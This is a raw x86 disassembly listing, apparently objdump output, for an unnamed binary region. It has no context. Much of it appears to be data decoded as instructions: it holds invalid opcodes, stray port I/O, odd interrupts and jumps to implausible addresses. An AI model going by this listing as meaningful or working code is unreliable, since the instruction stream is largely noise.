  4a2928:	xchg   DWORD PTR [eax-0x7fca0336],edx
  4a292e:	add    esi,DWORD PTR [esi]
  4a2930:	and    esp,esp
  4a2932:	cmp    DWORD PTR [esp+eax*1+0xe793704],eax
  4a2939:	and    DWORD PTR [ebp+0x50c3888],edx
  4a293f:	cmp    DWORD PTR [ebx+0x48],eax
  4a2942:	or     BYTE PTR gs:[eax+0x1952143a],dl
  4a2949:	inc    edx
  4a294a:	sahf   
  4a294b:	push   es
  4a294c:	cmp    ebx,DWORD PTR [eax-0x186f79c4]
  4a2952:	adc    BYTE PTR [edi+eax*1],bl
  4a2955:	cmp    eax,0x8439e4a0
  4a295a:	push   esp
  4a295b:	ds and al,0x8
  4a295e:	aas    
  4a295f:	push   cs
  4a2960:	and    DWORD PTR [ebp+0x2c40a821],edx
  4a2966:	or     DWORD PTR [eax+0x65],ecx
  4a2969:	or     BYTE PTR [ecx+0x41],bh
  4a296c:	mov    al,0x42
  4a296e:	sbb    DWORD PTR [edx-0x62],eax
  4a2971:	inc    ebx
  4a2972:	xor    al,0xa
  4a2974:	inc    ebx
  4a2975:	mov    eax,0x5210e790
  4a297a:	inc    esp
  4a297b:	cmp    al,0xb
  4a297d:	inc    ebp
  4a297e:	cmp    DWORD PTR [esp+edx*2+0x4446c086],eax
  4a2985:	or     al,0x21
  4a2987:	xchg   ebp,eax
  4a2988:	and    esp,esp
  4a298a:	inc    edi
  4a298b:	enter  0x6548,0x8
  4a298f:	jns    0x4a299f
  4a2991:	dec    esp
  4a2992:	or     eax,0x9e42d049
  4a2997:	inc    ebx
  4a2998:	dec    eax
  4a2999:	dec    edx
  4a299a:	push   esp
  4a299b:	push   cs
  4a299c:	dec    ebx
  4a299d:	out    0x10,eax
  4a299f:	push   edx
  4a29a0:	sbb    eax,ebx
  4a29a2:	dec    esp
  4a29a3:	pop    esp
  4a29a4:	je     0x4ddaaffe
  4a29aa:	loopne 0x4a29fa
  4a29ac:	xchg   ebp,eax
  4a29ad:	and    esp,esp
  4a29af:	cmp    DWORD PTR [eax+edx*1+0x4f],esp
  4a29b3:	call   0xec33208
  4a29b8:	and    DWORD PTR [ecx+edx*1+0x51],ebp
  4a29bc:	sahf   
  4a29bd:	inc    ebx
  4a29be:	dec    eax
  4a29bf:	gs lock push edx
  4a29c2:	je     0x4a29d6
  4a29c4:	push   ebx
  4a29c5:	adc    BYTE PTR [edx+0x19],dl
  4a29c8:	inc    edx
  4a29c9:	clc    
  4a29ca:	push   esp
  4a29cb:	cmp    al,0x87
  4a29cd:	nop
  4a29ce:	out    0x7c,eax
  4a29d0:	adc    edx,DWORD PTR [ebp+0x0]
  4a29d3:	adc    al,0x56
  4a29d5:	and    DWORD PTR [edx+esi*1-0x56a87b7c],esp
  4a29dc:	or     al,0x21
  4a29de:	iret   
  4a29df:	or     BYTE PTR ds:0x43598c58,dl
  4a29e5:	enter  0x873,0x10
  4a29e9:	push   ss
  4a29ea:	pop    edx
  4a29eb:	xchg   esp,eax
  4a29ec:	repnz sbb al,0x42
  4a29ef:	sub    bl,BYTE PTR [ebx+0x18]
  4a29f2:	pop    ss
  4a29f3:	pop    esp
  4a29f4:	xchg   DWORD PTR [eax+0x5d9c10ca],edx
  4a29fa:	and    BYTE PTR [eax],bl
  4a29fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a29fd:	xor    al,BYTE PTR [esp+edi*1+0xc5fa45e]
  4a2a04:	and    edi,ecx
  4a2a06:	and    DWORD PTR [eax],ebp
  4a2a08:	sbb    DWORD PTR [eax-0x54],esp
  4a2a0b:	enter  0x873,0xa9
  4a2a0f:	popa   
  4a2a10:	xor    BYTE PTR [edx],bl
  4a2a12:	bound  ebx,QWORD PTR [edx+eax*2]
  4a2a15:	sub    al,BYTE PTR [ebx-0x4c]
  4a2a18:	arpl   WORD PTR [eax],di
  4a2a1a:	sbb    edx,DWORD PTR [eax+0x64f210ca]
  4a2a20:	mov    esp,0x3c843265
  4a2a25:	xchg   DWORD PTR [eax+0x1c],eax
  4a2a28:	les    sp,DWORD PTR [ecx]
  4a2a2b:	iret   
  4a2a2c:	and    DWORD PTR [edi+eiz*2+0x73681d48],esp
  4a2a33:	or     BYTE PTR [ecx+0x5069cc0c],ch
  4a2a39:	push   ds
  4a2a3a:	inc    edx
  4a2a3b:	sub    al,BYTE PTR [ebx-0x38]
  4a2a3e:	push   0xffffffd4
  4a2a40:	imul   ecx,edx,0x10
  4a2a43:	repnz sbb al,0x58
  4a2a46:	pop    ds
  4a2a47:	ins    BYTE PTR es:[edi],dx
  4a2a48:	fadd   QWORD PTR [esp+edi*1+0x606d9087]
  4a2a4f:	and    BYTE PTR [esi+0xc],ch
  4a2a52:	xor    DWORD PTR [ecx-0x901bce],esp
  4a2a58:	and    DWORD PTR [ecx],esp
  4a2a5a:	int    0x10
  4a2a5c:	shl    BYTE PTR [eax+0x21],cl
  4a2a5f:	jno    0x4a2a2e
  4a2a61:	adc    dl,dl
  4a2a63:	or     al,0x22
  4a2a65:	jb     0x4a2a89
  4a2a67:	jae    0x4a2a79
  4a2a69:	ror    BYTE PTR [ecx+eiz*1],cl
  4a2a6c:	and    esi,DWORD PTR [edx+edx*8+0xc]
  4a2a70:	and    ebp,ecx
  4a2a72:	and    esi,DWORD PTR [ebp+0x24]
  4a2a75:	jbe    0x4a2a83
  4a2a77:	and    ebp,ecx
  4a2a79:	adc    BYTE PTR ds:0xcd212577,ah
  4a2a7f:	adc    dl,dl
  4a2a81:	js     0x4a2aa9
  4a2a83:	jns    0x4a2a52
  4a2a85:	adc    dl,dl
  4a2a87:	or     al,0x26
  4a2a89:	jp     0x4a2ab2
  4a2a8b:	jnp    0x4a2a9d
  4a2a8d:	ror    BYTE PTR [ecx+eiz*1],cl
  4a2a90:	daa    
  4a2a91:	jl     0x4a2a65
  4a2a93:	or     al,0x21
  4a2a95:	int    0x28
  4a2a97:	jge    0x4a2ac1
  4a2a99:	jle    0x4a2aa7
  4a2a9b:	and    ebp,ecx
  4a2a9d:	adc    BYTE PTR [ecx],ch
  4a2a9f:	jg     0x4a2aca
  4a2aa1:	and    ebp,ecx
  4a2aa3:	adc    dl,dl
  4a2aa5:	sub    BYTE PTR [edx],0x81
  4a2aa8:	int    0x10
  4a2aaa:	ror    BYTE PTR [edx+ebp*1],cl
  4a2aad:	sub    BYTE PTR [ebx],0x83
  4a2ab0:	adc    dl,dl
  4a2ab2:	or     al,0x21
  4a2ab4:	sub    eax,DWORD PTR [edx+edx*8+0x2ccd210c]
  4a2abb:	test   DWORD PTR [esi+eax*4],ebp
  4a2abe:	or     al,0x21
  4a2ac0:	int    0x10
  4a2ac2:	sub    eax,0xcd212d87
  4a2ac7:	adc    dl,dl
  4a2ac9:	mov    BYTE PTR [esi],ch
  4a2acb:	mov    ebp,ecx
  4a2acd:	adc    dl,dl
  4a2acf:	or     al,0x2e
  4a2ad1:	mov    ch,BYTE PTR [edi]
  4a2ad3:	mov    edx,DWORD PTR [eax]
  4a2ad5:	ror    BYTE PTR [ecx+eiz*1],cl
  4a2ad8:	das    
  4a2ad9:	mov    edx,ss
  4a2adb:	or     al,0x21
  4a2add:	int    0x30
  4a2adf:	lea    esi,[eax]
  4a2ae1:	mov    cs,WORD PTR [ecx+eiz*1]
  4a2ae4:	int    0x10
  4a2ae6:	xor    DWORD PTR [edi+0x10cd2131],ecx
  4a2aec:	rcl    BYTE PTR [eax+0x10cd9132],cl
  4a2af2:	ror    BYTE PTR [edx+esi*1],cl
  4a2af5:	xchg   edx,eax
  4a2af6:	xor    edx,DWORD PTR [ebx+0x210cd210]
  4a2afc:	xor    edx,DWORD PTR [edx+edx*8+0x34cd210c]
  4a2b03:	xchg   ebp,eax
  4a2b04:	xor    eax,0xcd210c96
  4a2b09:	adc    BYTE PTR ds:0xcd213697,dh
  4a2b0f:	adc    dl,dl
  4a2b11:	cwde   
  4a2b12:	ss cdq 
  4a2b14:	int    0x10
  4a2b16:	ror    BYTE PTR [edi+esi*1],cl
  4a2b19:	call   0x210c:0xd2109b37
  4a2b20:	cmp    BYTE PTR [edx+edx*8+0x38cd210c],bl
  4a2b27:	popf   
  4a2b28:	cmp    DWORD PTR [esi+0x10cd210c],ebx
  4a2b2e:	cmp    DWORD PTR [edi+0x10cd213a],ebx
  4a2b34:	shl    BYTE PTR [eax+0x10cda13a],cl
  4a2b3a:	ror    BYTE PTR [ebx+edi*1],cl
  4a2b3d:	mov    ds:0xd210a33b,al
  4a2b42:	or     al,0x21
  4a2b44:	cmp    al,0xa4
  4a2b46:	ror    BYTE PTR [ecx+eiz*1],cl
  4a2b49:	int    0x3c
  4a2b4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a2b4c:	cmp    eax,0xcd210ca6
  4a2b51:	adc    BYTE PTR ds:0xcd213ea7,bh
  4a2b57:	adc    dl,dl
  4a2b59:	test   al,0x3e
  4a2b5b:	test   eax,0xcd210cd
  4a2b60:	aas    
  4a2b61:	stos   BYTE PTR es:[edi],al
  4a2b62:	aas    
  4a2b63:	stos   DWORD PTR es:[edi],eax
  4a2b64:	adc    dl,dl
  4a2b66:	or     al,0x21
  4a2b68:	inc    eax
  4a2b69:	lods   al,BYTE PTR ds:[esi]
  4a2b6a:	ror    BYTE PTR [ecx+eiz*1],cl
  4a2b6d:	int    0x40
  4a2b6f:	lods   eax,DWORD PTR ds:[esi]
  4a2b70:	inc    ecx
  4a2b71:	scas   al,BYTE PTR es:[edi]
  4a2b72:	or     al,0x21
  4a2b74:	int    0x10
  4a2b76:	inc    ecx
  4a2b77:	scas   eax,DWORD PTR es:[edi]
  4a2b78:	inc    edx
  4a2b79:	and    ebp,ecx
  4a2b7b:	adc    dl,dl
  4a2b7d:	mov    al,0x42
  4a2b7f:	mov    cl,0xcd
  4a2b81:	adc    dl,dl
  4a2b83:	or     al,0x43
  4a2b85:	mov    dl,0x43
  4a2b87:	mov    bl,0x10
  4a2b89:	ror    BYTE PTR [ecx+eiz*1],cl
  4a2b8c:	inc    esp
  4a2b8d:	mov    ah,0xd2
  4a2b8f:	or     al,0x21
  4a2b91:	int    0x44
  4a2b93:	mov    ch,0x45
  4a2b95:	mov    dh,0xc
  4a2b97:	and    ebp,ecx
  4a2b99:	adc    BYTE PTR [esi-0x49],al
  4a2b9c:	inc    esi
  4a2b9d:	and    ebp,ecx
  4a2b9f:	adc    dl,dl
  4a2ba1:	mov    eax,0x10cdb947
  4a2ba6:	ror    BYTE PTR [edi+eax*2],cl
  4a2ba9:	mov    edx,0xd210bb48
  4a2bae:	or     al,0x21
  4a2bb0:	dec    eax
  4a2bb1:	mov    esp,0xcd210cd2
  4a2bb6:	dec    ecx
  4a2bb7:	mov    ebp,0x210cbe49
  4a2bbc:	int    0x10
  4a2bbe:	dec    edx
  4a2bbf:	mov    edi,0x10cd214a
  4a2bc4:	rol    al,cl
  4a2bc6:	dec    ebx
  4a2bc7:	ror    ebp,0x10
  4a2bca:	ror    BYTE PTR [ebx+ecx*2],cl
  4a2bcd:	ret    0xc34c
  4a2bd0:	adc    dl,dl
  4a2bd2:	or     al,0x21
  4a2bd4:	dec    esp
  4a2bd5:	(bad)  
  4a2bd6:	ror    BYTE PTR [ecx+eiz*1],cl
  4a2bd9:	int    0x4d
  4a2bdb:	lds    ecx,FWORD PTR [ebp-0x3a]
  4a2bde:	or     al,0x21
  4a2be0:	int    0x10
  4a2be2:	dec    esi
  4a2be3:	(bad)  
  4a2be4:	dec    esi
  4a2be5:	and    ebp,ecx
  4a2be7:	adc    dl,dl
  4a2be9:	enter  0xc94f,0xcd
  4a2bed:	adc    dl,dl
  4a2bef:	or     al,0x4f
  4a2bf1:	retf   0xcb50
  4a2bf4:	mov    edx,edx
  4a2bf6:	or     al,0x21
  4a2bf8:	push   eax
  4a2bf9:	int3   
  4a2bfa:	int    0x10
  4a2bfc:	rcr    BYTE PTR [ecx+edx*2-0x33],cl
  4a2c00:	push   ecx
  4a2c01:	into   
  4a2c02:	inc    eax
  4a2c03:	fmul   DWORD PTR [ecx+eiz*1]
  4a2c06:	push   edx
  4a2c07:	iret   
  4a2c08:	pop    es
  4a2c09:	test   al,0xd0
  4a2c0b:	sbb    eax,0x49e86d34
  4a2c10:	ror    BYTE PTR ds:0x86f210ca,1
  4a2c16:	push   ebx
  4a2c17:	cmp    dl,cl
  4a2c19:	lock test BYTE PTR [edi+eax*4],bh
  4a2c1d:	nop
  4a2c1e:	shl    BYTE PTR [esp+edx*2-0x2d],cl
  4a2c22:	iret   
  4a2c23:	and    DWORD PTR [edx+esi*1+0x557cd4f8],esp
  4a2c2a:	aad    0x8
  4a2c2c:	jns    0x4a2c3c
  4a2c2e:	and    DWORD PTR [eax],eax
  4a2c30:	push   esi
  4a2c31:	(bad)  
  4a2c32:	sahf   
  4a2c33:	inc    ebx
  4a2c34:	dec    eax
  4a2c35:	gs test bh,dl
  4a2c38:	or     BYTE PTR [edi-0x28],dl
  4a2c3b:	adc    BYTE PTR [edx+0x19],dl
  4a2c3e:	inc    edx
  4a2c3f:	mov    ecx,ds
  4a2c41:	push   esp
  4a2c42:	xchg   BYTE PTR [eax-0x25a7ef19],dl
  4a2c48:	xchg   esp,eax
  4a2c49:	(bad)  [ecx]
  4a2c4b:	in     al,0x39
  4a2c4d:	test   BYTE PTR [eax],bl
  4a2c4f:	pop    ecx
  4a2c50:	fdivr  QWORD PTR [ecx+0xe]
  4a2c53:	and    DWORD PTR [ebp+0x5a20dd9c],edx
  4a2c59:	fiadd  WORD PTR [ebx+0x48]
  4a2c5c:	or     BYTE PTR gs:[edi+ebx*8+0x42195228],ah
  4a2c64:	sahf   
  4a2c65:	pop    ebx
  4a2c66:	loopne 0x4a2c14
  4a2c68:	loope  0x4a2bf0
  4a2c6a:	nop
  4a2c6b:	out    0x10,eax
  4a2c6d:	xor    BYTE PTR [edx+eiz*8-0x4c],bl
  4a2c71:	in     al,0x39
  4a2c73:	test   BYTE PTR [ebx+eiz*8+0x38],dl
  4a2c77:	pop    ebp
  4a2c78:	in     al,0xe
  4a2c7a:	and    DWORD PTR [ebp+0x40e5bc21],edx
  4a2c80:	pop    esi
  4a2c81:	dec    eax
  4a2c82:	or     BYTE PTR gs:[ecx-0x1a],bh
  4a2c86:	(bad)  
  4a2c87:	out    0x19,eax
  4a2c89:	inc    edx
  4a2c8a:	sahf   
  4a2c8b:	inc    ebx
  4a2c8c:	dec    eax
  4a2c8d:	pop    edi
  4a2c8e:	call   0x1131bd5f
  4a2c93:	push   edx
  4a2c94:	jmp    0x3a348ce9
  4a2c99:	test   BYTE PTR [esi+eax*4-0x2c],dl
  4a2c9d:	jmp    0x4a2cf7
  4a2c9f:	popa   
  4a2ca0:	and    DWORD PTR [ebp-0x23131bdf],edx
  4a2ca6:	in     eax,dx
  4a2ca7:	or     BYTE PTR gs:[ecx+0xe],bh
  4a2cab:	pusha  
  4a2cac:	(bad)  
  4a2cad:	out    dx,al
  4a2cae:	in     al,0x42
  4a2cb0:	sahf   
  4a2cb1:	inc    ebx
  4a2cb2:	dec    eax
  4a2cb3:	out    dx,eax
  4a2cb4:	push   0x10e7f063
  4a2cb9:	push   edx
  4a2cba:	sbb    esp,ebp
  4a2cbc:	icebp  
  4a2cbd:	jo     0x4a2d23
  4a2cbf:	test   BYTE PTR [esi+eax*4-0x70],dl
  4a2cc3:	repnz hlt 
  4a2cc5:	repz xchg ebp,eax
  4a2cc7:	and    esp,esp
  4a2cc9:	cmp    DWORD PTR [eax+0x65],edi
  4a2ccc:	hlt    
  4a2ccd:	cld    
  4a2cce:	cmc    
  4a2ccf:	or     BYTE PTR [ecx+0xe],bh
  4a2cd2:	and    DWORD PTR [eax+0x432af666],eax
  4a2cd8:	enter  0x473,0x67
  4a2cdc:	test   DWORD PTR [eax+0x1cf210f8],0xf9680c42
  4a2ce6:	cmp    al,0x87
  4a2ce8:	nop
  4a2ce9:	retf   0xfa90
  4a2cec:	adc    al,0x69
  4a2cee:	sti    
  4a2cef:	and    DWORD PTR [edx+esi*1-0x5603677c],esp
  4a2cf6:	or     al,0x21
  4a2cf8:	iret   
  4a2cf9:	sbb    al,0x6a
  4a2cfb:	std    
  4a2cfc:	mov    al,ds:0x73c843fe
  4a2d01:	or     BYTE PTR [ebx+ebp*2],ah
  4a2d04:	jmp    FWORD PTR [eax+0x2b205e79]
  4a2d0a:	add    BYTE PTR [eax],cl
  4a2d0c:	sub    al,0x6c
  4a2d0e:	add    DWORD PTR [ebx+0x48],eax
  4a2d11:	or     BYTE PTR gs:[eax+0x19523402],dh
  4a2d18:	inc    edx
  4a2d19:	sahf   
  4a2d1a:	ins    DWORD PTR es:[edi],dx
  4a2d1b:	add    edi,DWORD PTR [eax-0x186f79fc]
  4a2d21:	adc    BYTE PTR [esi+ebp*2],bh
  4a2d24:	add    eax,0x8439e4c0
  4a2d29:	push   esp
  4a2d2a:	push   es
  4a2d2b:	inc    esp
  4a2d2c:	outs   dx,DWORD PTR ds:[esi]
  4a2d2d:	pop    es
  4a2d2e:	push   cs
  4a2d2f:	and    DWORD PTR [ebp+0x4c08c821],edx
  4a2d35:	jo     0x4a2d7f
  4a2d37:	or     BYTE PTR gs:[ecx+0x9],bh
  4a2d3b:	ror    BYTE PTR [edx],1
  4a2d3d:	sbb    DWORD PTR [edx-0x62],eax
  4a2d40:	inc    ebx
  4a2d41:	push   esp
  4a2d42:	jno    0x4a2d4f
  4a2d44:	fcom   DWORD PTR [eax+0xc5210e7]
  4a2d4a:	pop    esp
  4a2d4b:	jb     0x4a2d5a
  4a2d4d:	cmp    DWORD PTR [esp+edx*2+0x640ee086],eax
  4a2d54:	jae    0x4a2d77
  4a2d56:	xchg   ebp,eax
  4a2d57:	and    esp,esp
  4a2d59:	psubsb mm2,QWORD PTR [eax]
  4a2d5c:	or     BYTE PTR gs:[ecx+0xe],bh
  4a2d60:	ins    BYTE PTR es:[edi],dx
  4a2d61:	je     0x4a2d74
  4a2d63:	lock inc edx
  4a2d65:	sahf   
  4a2d66:	inc    ebx
  4a2d67:	dec    eax
  4a2d68:	adc    dh,BYTE PTR [ebp+esi*2+0x13]
  4a2d6c:	out    0x10,eax
  4a2d6e:	push   edx
  4a2d6f:	sbb    eax,edi
  4a2d71:	adc    al,0x7c
  4a2d73:	jbe    0x4a2cf9
  4a2d75:	cmp    al,0x87
  4a2d77:	nop
  4a2d78:	adc    eax,0xcf167700
  4a2d7d:	and    DWORD PTR [edx+esi*1+0x78081784],esp
  4a2d84:	sbb    BYTE PTR [eax],cl
  4a2d86:	test   eax,0x198c210c
  4a2d8b:	sub    al,BYTE PTR [ebx-0x38]
  4a2d8e:	jae    0x4a2da0
  4a2d90:	jns    0x4a2dac
  4a2d92:	xchg   esp,eax
  4a2d93:	sbb    edx,DWORD PTR [eax]
  4a2d95:	repnz sbb al,0x42
  4a2d98:	sbb    BYTE PTR [edx+0x1c],bh
  4a2d9b:	cmp    al,0x87
  4a2d9d:	nop
  4a2d9e:	retf   0x1d9c
  4a2da1:	and    BYTE PTR [ebx+0x1e],bh
  4a2da4:	and    DWORD PTR [edx+esi*1-0x56e05b7c],esp
  4a2dab:	or     al,0x21
  4a2dad:	iret   
  4a2dae:	sub    BYTE PTR [eax+eiz*1-0x54],bh
  4a2db2:	and    DWORD PTR [ebx-0x38],eax
  4a2db5:	jae    0x4a2dbf
  4a2db7:	xor    BYTE PTR [ebp+0x22],bh
  4a2dba:	mov    ah,0xf2
  4a2dbc:	sbb    al,0x42
  4a2dbe:	sub    ah,BYTE PTR [ebx]
  4a2dc0:	cmp    BYTE PTR [esi+0x24],bh
  4a2dc3:	xchg   DWORD PTR [eax+0x25bc10ca],edx
  4a2dc9:	inc    eax
  4a2dca:	jg     0x4a2d70
  4a2dcc:	xor    al,BYTE PTR [esp+edi*1+0xc27c426]
  4a2dd3:	and    edi,ecx
  4a2dd5:	and    DWORD PTR [eax-0x80],ecx
  4a2dd8:	sub    ah,cl
  4a2dda:	enter  0x873,0xa9
  4a2dde:	sub    DWORD PTR [eax-0x7f],edx
  4a2de1:	sub    bl,BYTE PTR [edx+eax*2]
  4a2de4:	sub    al,BYTE PTR [ebx-0x2c]
  4a2de7:	sub    ebx,DWORD PTR [eax-0x7e]
  4a2dea:	nop
  4a2deb:	retf   0xf210
  4a2dee:	sub    al,0xdc
  4a2df0:	sub    eax,0x873c8432
  4a2df5:	pusha  
  4a2df6:	sub    DWORD PTR [esi],0xffffffe4
  4a2df9:	and    edi,ecx
  4a2dfb:	and    DWORD PTR [edi+ebp*1+0x73308468],esp
  4a2e02:	or     BYTE PTR [ecx+0x7031ec0c],ch
  4a2e08:	test   DWORD PTR [edx+0x2a],eax
  4a2e0b:	inc    ebx
  4a2e0c:	enter  0xf432,0x33
  4a2e10:	retf   0xf210
  4a2e13:	sbb    al,0x78
  4a2e15:	xchg   BYTE PTR [esp+edi*8],dh
  4a2e18:	test   BYTE PTR [edi+eax*4],bh
  4a2e1b:	nop
  4a2e1c:	xor    eax,0x95368780
  4a2e21:	and    esp,esp
  4a2e23:	cmp    DWORD PTR [eax+ecx*4],eax
  4a2e26:	aaa    
  4a2e27:	mov    BYTE PTR [eax],bh
  4a2e29:	or     BYTE PTR [ecx+0xe],bh
  4a2e2c:	and    DWORD PTR [ecx+ecx*4],ecx
  4a2e2f:	cmp    DWORD PTR [esi-0x6f9ab7bd],ebx
  4a2e35:	cmp    dl,BYTE PTR [edx+ecx*4]
  4a2e38:	cmp    edx,DWORD PTR [eax]
  4a2e3a:	push   edx
  4a2e3b:	sbb    DWORD PTR [edx-0x68],eax
  4a2e3e:	cmp    al,0x54
  4a2e40:	xchg   BYTE PTR [eax+0x3d8b1ce7],dl
  4a2e46:	mov    al,ds:0x39e4213e
  4a2e4b:	test   BYTE PTR [esp+ecx*4],ah
  4a2e4e:	aas    
  4a2e4f:	data16 mov BYTE PTR [ecx],cl
  4a2e52:	xchg   ebp,eax
  4a2e53:	test   al,0x40
  4a2e55:	dec    DWORD PTR [ebp-0x6f7996f8]
  4a2e5b:	inc    ecx
  4a2e5c:	lea    eax,[edx+0x69]
  4a2e5f:	xchg   BYTE PTR [eax-0x71bc719a],dl
  4a2e65:	inc    esp
  4a2e66:	xchg   BYTE PTR [eax+0x458f0866],dl
  4a2e6c:	(bad)  
  4a2e6d:	nop
  4a2e6e:	data16 or BYTE PTR [ecx+0x46],ch
  4a2e72:	nop
  4a2e73:	inc    edi
  4a2e74:	data16 or BYTE PTR [ecx-0x7a],ch
  4a2e78:	nop
  4a2e79:	dec    eax
  4a2e7a:	xchg   ecx,eax
  4a2e7b:	or     BYTE PTR [ecx-0x7a],ch
  4a2e7e:	nop
  4a2e7f:	dec    ecx
  4a2e80:	xchg   ecx,eax
  4a2e81:	dec    edx
  4a2e82:	imul   eax,DWORD PTR [esi+0x4b926690],0x90864c92
  4a2e8c:	data16 or BYTE PTR [ebx+0x6690934d],dl
  4a2e93:	or     BYTE PTR [ecx+0x4e],ch
  4a2e96:	xchg   esp,eax
  4a2e97:	dec    edi
  4a2e98:	data16 or BYTE PTR [ecx-0x7a],ch
  4a2e9c:	xchg   esp,eax
  4a2e9d:	push   eax
  4a2e9e:	xchg   ebp,eax
  4a2e9f:	or     BYTE PTR [ecx-0x7a],ch
  4a2ea2:	nop
  4a2ea3:	push   ecx
  4a2ea4:	xchg   ebp,eax
  4a2ea5:	push   edx
  4a2ea6:	imul   eax,DWORD PTR [esi+0x53966690],0x90865496
  4a2eb0:	data16 or BYTE PTR [edi+0x66909855],dl
  4a2eb7:	or     BYTE PTR [ecx+0x56],ch
  4a2eba:	cwde   
  4a2ebb:	push   edi
  4a2ebc:	data16 or BYTE PTR [ecx-0x7a],ch
  4a2ec0:	cdq    
  4a2ec1:	pop    eax
  4a2ec2:	cdq    
  4a2ec3:	or     BYTE PTR [ecx-0x7a],ch
  4a2ec6:	nop
  4a2ec7:	pop    ecx
  4a2ec8:	call   0x9a66:0x9086695a
  4a2ecf:	pop    ebx
  4a2ed0:	fwait
  4a2ed1:	pop    esp
  4a2ed2:	xchg   BYTE PTR [eax+0x5d9b0866],dl
  4a2ed8:	pushf  
  4a2ed9:	nop
  4a2eda:	data16 or BYTE PTR [ecx+0x5e],ch
  4a2ede:	pushf  
  4a2edf:	pop    edi
  4a2ee0:	data16 or BYTE PTR [ecx-0x7a],ch
  4a2ee4:	popf   
  4a2ee5:	pusha  
  4a2ee6:	popf   
  4a2ee7:	or     BYTE PTR [ecx-0x7a],ch
  4a2eea:	nop
  4a2eeb:	popa   
  4a2eec:	sahf   
  4a2eed:	bound  ebp,QWORD PTR [ecx-0x7a]
  4a2ef0:	nop
  4a2ef1:	data16 sahf 
  4a2ef3:	arpl   WORD PTR [edi+0x66908664],bx
  4a2ef9:	or     BYTE PTR [edi+0x6690a065],bl
  4a2eff:	or     BYTE PTR [ecx+0x66],ch
  4a2f02:	mov    al,ds:0x69086667
  4a2f07:	xchg   BYTE PTR [ecx+0x6908a168],ah
  4a2f0d:	xchg   BYTE PTR [eax+0x696aa269],dl
  4a2f13:	xchg   BYTE PTR [eax-0x5c945d9a],dl
  4a2f19:	ins    BYTE PTR es:[edi],dx
  4a2f1a:	xchg   BYTE PTR [eax+0x6da30866],dl
  4a2f20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a2f21:	nop
  4a2f22:	data16 or BYTE PTR [ecx+0x6e],ch
  4a2f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a2f27:	outs   dx,DWORD PTR ds:[esi]
  4a2f28:	data16 or BYTE PTR [ecx-0x7a],ch
  4a2f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a2f2d:	jo     0x4a2ed4
  4a2f2f:	or     BYTE PTR [ecx-0x7a],ch
  4a2f32:	nop
  4a2f33:	jno    0x4a2edb
  4a2f35:	jb     0x4a2fa0
  4a2f37:	xchg   BYTE PTR [eax-0x588c599a],dl
  4a2f3d:	je     0x4a2ec5
  4a2f3f:	nop
  4a2f40:	data16 or BYTE PTR [edi+0x6690a875],ah
  4a2f47:	or     BYTE PTR [ecx+0x76],ch
  4a2f4a:	test   eax,0x69086677
  4a2f4f:	xchg   BYTE PTR [ecx+0x6908aa78],ch
  4a2f55:	xchg   BYTE PTR [eax+0x697aaa79],dl
  4a2f5b:	xchg   BYTE PTR [eax-0x5484549a],dl
  4a2f61:	jl     0x4a2ee9
  4a2f63:	nop
  4a2f64:	data16 or BYTE PTR [ebp+edi*2+0x86690ac],ch
  4a2f6c:	imul   edi,DWORD PTR [esi-0x53],0x6908667f
  4a2f73:	xchg   BYTE PTR [ebp+0x6908ae80],ch
  4a2f79:	xchg   BYTE PTR [eax+0x6982ae81],dl
  4a2f7f:	xchg   BYTE PTR [eax-0x507c509a],dl
  4a2f85:	test   BYTE PTR [esi-0x4ff79970],al
  4a2f8b:	test   DWORD PTR [eax+0x69086690],esi
  4a2f91:	xchg   BYTE PTR [ecx+0x69086687],dh
  4a2f97:	xchg   BYTE PTR [ecx+0x6908b288],dh
  4a2f9d:	xchg   BYTE PTR [eax+0x698ab289],dl
  4a2fa3:	xchg   BYTE PTR [eax-0x4c744c9a],dl
  4a2fa9:	mov    WORD PTR [esi-0x4bf79970],es
  4a2faf:	lea    esi,[eax+edx*4-0x7196f79a]
  4a2fb6:	mov    ch,0x8f
  4a2fb8:	data16 or BYTE PTR [ecx-0x7a],ch
  4a2fbc:	mov    ch,0x90
  4a2fbe:	mov    dh,0x8
  4a2fc0:	imul   eax,DWORD PTR [esi-0x6d496e70],0x66908669
  4a2fca:	mov    bh,0x93
  4a2fcc:	mov    bh,0x94
  4a2fce:	xchg   BYTE PTR [eax-0x6a47f79a],dl
  4a2fd4:	mov    ecx,0x69086690
  4a2fd9:	xchg   esi,eax
  4a2fda:	mov    ecx,0x69086697
  4a2fdf:	xchg   BYTE PTR [edx+0x6908ba98],bh
  4a2fe5:	xchg   BYTE PTR [eax+0x699abb99],dl
  4a2feb:	xchg   BYTE PTR [eax-0x4364449a],dl
  4a2ff1:	pushf  
  4a2ff2:	xchg   BYTE PTR [eax-0x6243f79a],dl
  4a2ff8:	mov    ebp,0x69086690
  4a2ffd:	sahf   
  4a2ffe:	mov    ebp,0x6908669f
  4a3003:	xchg   BYTE PTR [esi+0x6908bea0],bh
  4a3009:	xchg   BYTE PTR [eax+0x69a2bfa1],dl
  4a300f:	xchg   BYTE PTR [eax-0x3f5c409a],dl
  4a3015:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a3016:	xchg   BYTE PTR [eax-0x5a3ff79a],dl
  4a301c:	rcl    DWORD PTR [eax-0x5996f79a],0xc1
  4a3023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a3024:	data16 or BYTE PTR [ecx-0x7a],ch
  4a3028:	ret    0xc2a8
  4a302b:	or     BYTE PTR [ecx-0x7a],ch
  4a302e:	nop
  4a302f:	test   eax,0x8669aac3
  4a3034:	nop
  4a3035:	retw   
  4a3037:	stos   DWORD PTR es:[edi],eax
  4a3038:	les    ebp,FWORD PTR [esi+eax*4-0x3bf79970]
  4a303f:	lods   eax,DWORD PTR ds:[esi]
  4a3040:	lds    edx,FWORD PTR [eax-0x5196f79a]
  4a3046:	lds    ebp,FWORD PTR [edi-0x7996f79a]
  4a304c:	(bad)  
  4a304d:	mov    al,0xc6
  4a304f:	or     BYTE PTR [ecx-0x7a],ch
  4a3052:	nop
  4a3053:	mov    cl,0xc7
  4a3055:	mov    dl,0x69
  4a3057:	xchg   BYTE PTR [eax-0x374c389a],dl
  4a305d:	mov    ah,0x86
  4a305f:	nop
  4a3060:	data16 or al,cl
  4a3063:	mov    ch,0xc9
  4a3065:	nop
